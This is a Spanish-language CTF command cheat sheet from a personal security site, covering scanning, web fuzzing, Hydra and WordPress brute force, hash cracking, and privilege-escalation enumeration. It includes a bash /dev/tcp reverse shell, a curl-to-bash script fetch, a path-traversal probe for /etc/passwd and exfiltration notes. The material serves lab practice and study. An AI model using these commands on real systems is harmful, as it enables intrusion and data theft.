@@ -1,0 +1,314 @@
+<!DOCTYPE html><!-- Layout específico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/apuntes.fBeTOWmP.css">
+<link rel="stylesheet" href="/assets/apuntes.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si está disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Informatica y Ciberseguridad</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/apuntes">Apuntes</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-3xl mx-auto px-6"> <div class="mb-12"> <a href="/apuntes" class="text-sm text-slate-400 hover:text-accentBlue transition-colors">
+← Volver a Apuntes
+</a> <h1 class="text-4xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Comandos y apuntes para CTFs </h1>  <div class="flex flex-wrap gap-3">  </div> </div> <div class="prose prose-projects prose-invert prose-xl max-w-none"> <h1 id="carpetas">Carpetas</h1>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#BD93F9">MAQUINA</span><span style="color:#FF79C6">=</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">soulmate</span><span style="color:#E9F284">"</span><span style="color:#6272A4"> # Ejemplo</span></span>
+<span class="line"><span style="color:#50FA7B">mkdir</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$MAQUINA</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">/{content,nmap,scripts}</span></span>
+<span class="line"></span></code></pre>
+<hr>
+<h1 id="-reconocimiento-de-red">🌐 Reconocimiento de Red</h1>
+<p><strong>Exportar resultados en XML y texto:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nmap</span><span style="color:#BD93F9"> -sSCV</span><span style="color:#BD93F9"> -p-</span><span style="color:#BD93F9"> --open</span><span style="color:#BD93F9"> -T4</span><span style="color:#BD93F9"> -Pn</span><span style="color:#BD93F9"> -n</span><span style="color:#BD93F9"> -vvv</span><span style="color:#BD93F9"> -oN</span><span style="color:#F1FA8C"> escaneo_nmap.txt</span><span style="color:#BD93F9"> -oX</span><span style="color:#F1FA8C"> escaneo_nmap.xml</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span></code></pre>
+<p><strong>Convertir XML a HTML:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">xsltproc</span><span style="color:#F1FA8C"> target.xml</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> target.html</span></span></code></pre>
+<hr>
+<h1 id="-enumeración-web">📁 Enumeración Web</h1>
+<h2 id="directorios">Directorios</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Cambiar User-Agent</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> dir</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://target.com</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span><span style="color:#BD93F9"> -b</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">NO-STATU</span><span style="color:#F8F8F2">S</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -q</span><span style="color:#BD93F9"> --timeout</span><span style="color:#F1FA8C"> 15s</span><span style="color:#BD93F9"> -a</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Mozilla/5.0</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> 2></span><span style="color:#F1FA8C">/dev/null</span><span style="color:#BD93F9"> -T</span><span style="color:#BD93F9"> 50</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">feroxbuster</span><span style="color:#BD93F9"> --url</span><span style="color:#F1FA8C"> http://</span><span style="color:#BD93F9">$target</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span><span style="color:#BD93F9"> -s</span><span style="color:#BD93F9"> 301</span><span style="color:#BD93F9"> --scan-dir-listings</span><span style="color:#BD93F9"> --depth</span><span style="color:#BD93F9"> 8</span></span>
+<span class="line"></span></code></pre>
+<h2 id="subdominios">Subdominios</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> dns</span><span style="color:#BD93F9"> -do</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINI</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">ffuf</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">DOMINI</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -H</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Host: FUZZ.soulmate.htb</span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><span style="color:#BD93F9"> -fw</span><span style="color:#BD93F9"> 4</span><span style="color:#BD93F9"> -t</span><span style="color:#BD93F9"> 200</span><span style="color:#BD93F9"> -ac</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">dnsrecon</span><span style="color:#BD93F9"> -d</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINI</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -n</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -t</span><span style="color:#F1FA8C"> brt</span><span style="color:#BD93F9"> -D</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">wfuzz</span><span style="color:#BD93F9"> -c</span><span style="color:#BD93F9"> --hc=404</span><span style="color:#BD93F9"> --hl=1</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span><span style="color:#BD93F9"> -H</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Host: FUZZ.dominio.com</span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -u</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
+<span class="line"></span>
+<span class="line"></span></code></pre>
+<h2 id="parámetros">Parámetros</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">wfuzz</span><span style="color:#BD93F9"> -c</span><span style="color:#BD93F9"> --hc=404</span><span style="color:#BD93F9"> --hl=1</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><span style="color:#BD93F9"> -H</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Host: FUZZ.&#x3C;DOMINIO></span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -u</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">wfuzz</span><span style="color:#BD93F9"> -c</span><span style="color:#BD93F9"> --hc=404</span><span style="color:#BD93F9"> --hw</span><span style="color:#BD93F9"> 169</span><span style="color:#BD93F9"> -t</span><span style="color:#BD93F9"> 200</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">http://&#x3C;IP>/index.php?FUZZ=../../../../../../../../../etc/passwd</span><span style="color:#E9F284">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># GET</span></span>
+<span class="line"><span style="color:#50FA7B">ffuf</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/get.php?x=FUZZ</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/Web-Content/common.txt</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># POST</span></span>
+<span class="line"><span style="color:#50FA7B">ffuf</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C">/post.php</span><span style="color:#BD93F9"> -X</span><span style="color:#F1FA8C"> POST</span><span style="color:#BD93F9"> -H</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Content-Type: application/x-www-form-urlencoded</span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -d</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">y=FUZZ</span><span style="color:#E9F284">"</span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/Web-Content/common.txt</span><span style="color:#BD93F9"> -mc</span><span style="color:#BD93F9"> 200</span><span style="color:#BD93F9"> -v</span></span>
+<span class="line"></span></code></pre>
+<h2 id="virtual-hosts">Virtual Hosts</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> vhost</span><span style="color:#BD93F9"> -u</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> -w</span><span style="color:#F1FA8C"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt</span><span style="color:#BD93F9"> --append-domain</span><span style="color:#BD93F9"> -r</span></span>
+<span class="line"></span></code></pre>
+<h2 id="inspección-de-headers-y-recursos">Inspección de headers y recursos</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -s</span><span style="color:#BD93F9"> -I</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># GET mostrando cabeceras de respuesta</span></span>
+<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -i</span><span style="color:#F1FA8C"> https://example.com</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Mostrar solo cabeceras</span></span>
+<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -I</span><span style="color:#F1FA8C"> https://example.com</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Seguir redirecciones</span></span>
+<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -L</span><span style="color:#F1FA8C"> https://example.com</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Ver detalles de la transacción</span></span>
+<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -v</span><span style="color:#F1FA8C"> https://example.com</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Deshabilitar verificación SSL</span></span>
+<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#BD93F9"> -k</span><span style="color:#F1FA8C"> https://example.com</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Descarga sin archivos con cURL, lo ejecutamos de inmediato:</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">curl</span><span style="color:#F1FA8C"> https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> bash</span></span>
+<span class="line"></span></code></pre>
+<h2 id="revisión-de-javascript-expuesto">Revisión de JavaScript expuesto</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">wget</span><span style="color:#BD93F9"> -r</span><span style="color:#F1FA8C"> http://</span><span style="color:#FF79C6">&#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> grep</span><span style="color:#BD93F9"> -i</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">api\|key\|admin</span><span style="color:#E9F284">"</span><span style="color:#BD93F9;font-style:italic"> *</span><span style="color:#F1FA8C">.js</span></span></code></pre>
+<hr>
+<h1 id="️-herramientas-de-enumeración">🛠️ Herramientas de Enumeración</h1>
+<h2 id="linpeas">linPEAS</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">wget</span><span style="color:#F1FA8C"> https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">wget</span><span style="color:#F1FA8C"> https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</span><span style="color:#BD93F9"> -O</span><span style="color:#F1FA8C"> les.sh</span></span>
+<span class="line"><span style="color:#6272A4"># https://github.com/The-Z-Labs/linux-exploit-suggester</span></span>
+<span class="line"></span></code></pre>
+<h2 id="hydra">Hydra</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">hydra</span><span style="color:#BD93F9"> -t</span><span style="color:#BD93F9"> 64</span><span style="color:#BD93F9"> -l</span><span style="color:#F1FA8C"> admin</span><span style="color:#BD93F9"> -P</span><span style="color:#F1FA8C"> /usr/share/wordlists/rockyou.txt</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">I</span><span style="color:#F8F8F2">P</span><span style="color:#FF79C6">></span><span style="color:#F1FA8C"> http-post-form</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">/my_weblog/admin.php:username=admin&#x26;password=^PASS^:Incorrect username or password.</span><span style="color:#E9F284">"</span></span>
+<span class="line"></span></code></pre>
+<h2 id="reverse-shell">Reverse Shell</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">bash</span><span style="color:#BD93F9"> -c</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">bash -i>&#x26;/dev/tcp/&#x3C;IP>/&#x3C;PORT> 0>&#x26;1</span><span style="color:#E9F284">"</span></span>
+<span class="line"></span></code></pre>
+<h1 id="️-post-explotación-y-tty">🖥️ Post-Explotación y TTY</h1>
+<p><strong>Mejorar shell TTY:</strong></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">script</span><span style="color:#F1FA8C"> /dev/null</span><span style="color:#BD93F9"> -c</span><span style="color:#F1FA8C"> bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Ctrl+Z</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">stty</span><span style="color:#F1FA8C"> raw</span><span style="color:#BD93F9"> -echo</span><span style="color:#F8F8F2">; </span><span style="color:#8BE9FD">fg</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">reset</span><span style="color:#F1FA8C"> xterm</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">stty</span><span style="color:#F1FA8C"> rows</span><span style="color:#BD93F9"> 62</span><span style="color:#F1FA8C"> columns</span><span style="color:#BD93F9"> 248</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF79C6">export</span><span style="color:#BD93F9"> TERM</span><span style="color:#FF79C6">=</span><span style="color:#BD93F9">xterm</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF79C6">export</span><span style="color:#BD93F9"> SHELL</span><span style="color:#FF79C6">=</span><span style="color:#BD93F9">bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Otra forma</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">python3</span><span style="color:#BD93F9"> -c</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">import pty; pty.spawn("/bin/bash")</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2"> </span></span>
+<span class="line"></span>
+<span class="line"></span></code></pre>
+<hr>
+<h2 id="hoja-de-ruta-de-comandos-ctf-por-nivel-de-avance">Hoja de Ruta de Comandos CTF por Nivel de Avance</h2>
+<h3 id="nivel-1-reconocimiento-inicial-rápido-looting-básico">Nivel 1: Reconocimiento Inicial Rápido (Looting Básico)</h3>
+<p>Comandos de impacto bajo y alta ganancia para establecer el contexto y el entorno.</p>
+<ul>
+<li>
+<p><code>whoami</code></p>
+</li>
+<li>
+<p><code>id</code></p>
+</li>
+<li>
+<p><code>hostnamectl</code></p>
+</li>
+<li>
+<p><code>uname -a</code></p>
+</li>
+<li>
+<p><code>cat /etc/os-release</code></p>
+</li>
+<li>
+<p><code>history</code></p>
+</li>
+<li>
+<p><code>echo $PATH</code></p>
+</li>
+<li>
+<p><code>env</code></p>
+</li>
+<li>
+<p><code>ip a</code></p>
+</li>
+<li>
+<p><code>ss -tulnp | grep LISTEN</code></p>
+</li>
+<li>
+<p><code>w</code> o <code>who</code></p>
+</li>
+</ul>
+<hr>
+<h3 id="nivel-2-enumeración-profunda-búsqueda-de-rutas-de-escalada">Nivel 2: Enumeración Profunda (Búsqueda de Rutas de Escalada)</h3>
+<p>Análisis de permisos, archivos críticos, servicios y posibles fallas de configuración.</p>
+<ul>
+<li>
+<p><code>sudo -v</code></p>
+</li>
+<li>
+<p><code>sudo -l</code></p>
+</li>
+<li>
+<p><code>sudo -V | head -n1</code></p>
+</li>
+<li>
+<p><code>grep "sh$" /etc/passwd</code></p>
+</li>
+<li>
+<p><code>getent group sudo</code></p>
+</li>
+<li>
+<p><code>cat /etc/crontab</code></p>
+</li>
+<li>
+<p><code>ps aux</code></p>
+</li>
+<li>
+<p><code>lsof -i</code></p>
+</li>
+<li>
+<p><code>env | grep -i key</code></p>
+</li>
+<li>
+<p><code>find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null</code></p>
+</li>
+<li>
+<p><code>find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null</code></p>
+</li>
+<li>
+<p><code>ls -alR /home</code></p>
+</li>
+<li>
+<p><code>ls -la /var/backups</code></p>
+</li>
+</ul>
+<hr>
+<h3 id="nivel-3-vulnerabilidades-y-tácticas-de-explotación">Nivel 3: Vulnerabilidades y Tácticas de Explotación</h3>
+<p>Comandos enfocados en encontrar fallas de permisos y posibles lugares para escribir <em>shells</em>.</p>
+<ul>
+<li>
+<p><code>find / -type f -perm -4000 -user root 2>/dev/null</code></p>
+</li>
+<li>
+<p><code>find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null</code> (Más completo que el anterior)</p>
+</li>
+<li>
+<p><code>find / -writable -type d 2>/dev/null</code></p>
+</li>
+<li>
+<p><code>ls -alt /tmp</code></p>
+</li>
+<li>
+<p><code>tail -f /var/log/auth.log</code></p>
+</li>
+</ul>
+<hr>
+<h3 id="nivel-4-manejo-de-archivos-y-post-explotación">Nivel 4: Manejo de Archivos y <em>Post-Explotación</em></h3>
+<p>Comandos útiles para la exfiltración, transferencia o decodificación de datos una vez se ha obtenido acceso.</p>
+<ul>
+<li>
+<p><code>php -S 0.0.0.0:8000</code> (Servidor web temporal)</p>
+</li>
+<li>
+<p><code>ruby -run -ehttpd . -p8000</code> (Servidor web temporal)</p>
+</li>
+<li>
+<p><code>scp usuario@host:/ruta/archivo /ruta/local</code> (Descarga)</p>
+</li>
+<li>
+<p><code>scp /ruta/archivo usuario@host:/ruta/remota</code> (Subida)</p>
+</li>
+<li>
+<p><code>md5sum &#x3C;ARCHIVO></code></p>
+</li>
+<li>
+<p><code>cat &#x3C;ARCHIVO> | base64 -w 0;echo</code> (Codificación)</p>
+</li>
+<li>
+<p><code>echo -n '&#x3C;ARCHIVO CODIFICADO BASE64>' | base64 -d > &#x3C;NOMBRE NUEVO ARCHIVO></code> (Decodificación)</p>
+</li>
+</ul>
+<hr>
+<h3 id="nivel-5-búsqueda-de-flags-término-del-ctf">Nivel 5: Búsqueda de Flags (Término del CTF)</h3>
+<p>Comandos para encontrar los archivos <em>flag</em> una vez se tienen los permisos necesarios.</p>
+<ul>
+<li>
+<p><code>find / -type f -name "user.txt" 2>/dev/null</code></p>
+</li>
+<li>
+<p><code>find / -type f -name "root.txt" 2>/dev/null</code> (Asumiendo que se busca la <em>root flag</em>)</p>
+</li>
+<li>
+<p><code>locate user.txt</code></p>
+</li>
+<li>
+<p><code>grep -r "user.txt" / 2>/dev/null</code></p>
+</li>
+</ul>
+<hr>
+<h2 id="buscar-archivos-por-nombre">Buscar archivos por nombre</h2>
+<p>Testear:</p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#6272A4"># Extrae la ruta del request, la decodifica y devuelve solo el valor después de "/flag = "</span></span>
+<span class="line"><span style="color:#50FA7B">grep</span><span style="color:#BD93F9"> -i</span><span style="color:#BD93F9"> -m1</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">flag</span><span style="color:#E9F284">'</span><span style="color:#F1FA8C"> /var/log/apache2/access.log</span><span style="color:#FF79C6"> \</span></span>
+<span class="line"><span style="color:#FF79C6">  |</span><span style="color:#50FA7B"> sed</span><span style="color:#BD93F9"> -n</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">s/.*GET \([^ ]*\) HTTP.*/\1/p</span><span style="color:#E9F284">'</span><span style="color:#FF79C6"> \</span></span>
+<span class="line"><span style="color:#FF79C6">  |</span><span style="color:#50FA7B"> python3</span><span style="color:#BD93F9"> -c</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">import sys,urllib.parse as u,re</span></span>
+<span class="line"><span style="color:#F1FA8C">s = u.unquote(sys.stdin.read().strip())</span></span>
+<span class="line"><span style="color:#F1FA8C"># normaliza '+' a espacio por si acaso y busca '/flag = &#x3C;valor>'</span></span>
+<span class="line"><span style="color:#F1FA8C">s = s.replace('+',' ')</span></span>
+<span class="line"><span style="color:#F1FA8C">m = re.search(r'(?i)^/flag\s*=\s*(.*)', s)</span></span>
+<span class="line"><span style="color:#F1FA8C">print(m.group(1) if m else s)</span><span style="color:#E9F284">"</span></span>
+<span class="line"></span>
+<span class="line"></span></code></pre>
+<h1 id="-cracking-y-fuerza-bruta">🔑 Cracking y Fuerza Bruta</h1>
+<h2 id="local-john-the-ripper">Local (John The Ripper)</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">john</span><span style="color:#BD93F9"> --format=Raw-MD5</span><span style="color:#BD93F9"> --wordlist=/usr/share/wordlists/rockyou.txt</span><span style="color:#F1FA8C"> hash</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">zip2john</span><span style="color:#F1FA8C"> archivo.zip</span><span style="color:#FF79C6"> ></span><span style="color:#F1FA8C"> hashzip</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">john</span><span style="color:#BD93F9"> --wordlist=/usr/share/wordlists/rockyou.txt</span><span style="color:#F1FA8C"> hashzip</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">keepass2john</span><span style="color:#F1FA8C"> Database.kdbx</span><span style="color:#FF79C6"> ></span><span style="color:#F1FA8C"> hashkeepass</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#50FA7B">john</span><span style="color:#BD93F9"> --wordlist=/usr/share/wordlists/rockyou.txt</span><span style="color:#F1FA8C"> hashkeepass</span></span>
+<span class="line"></span></code></pre>
+<hr>
+<h1 id="-wordpress">💻 WordPress</h1>
+<h2 id="enumeración-y-fuerza-bruta">Enumeración y fuerza bruta</h2>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"></span>
+<span class="line"><span style="color:#50FA7B">wpscan</span><span style="color:#BD93F9"> --url</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINI</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> --enumerate</span><span style="color:#F1FA8C"> u,vp</span><span style="color:#BD93F9"> --random-user-agent</span><span style="color:#BD93F9"> --force</span></span>
+<span class="line"><span style="color:#50FA7B">wpscan</span><span style="color:#BD93F9"> --url</span><span style="color:#FF79C6"> &#x3C;</span><span style="color:#F1FA8C">DOMINI</span><span style="color:#F8F8F2">O</span><span style="color:#FF79C6">></span><span style="color:#BD93F9"> --passwords</span><span style="color:#F1FA8C"> rockyou.txt</span><span style="color:#BD93F9"> --usernames</span><span style="color:#F1FA8C"> administracion</span><span style="color:#BD93F9"> --random-user-agent</span><span style="color:#BD93F9"> --force</span></span>
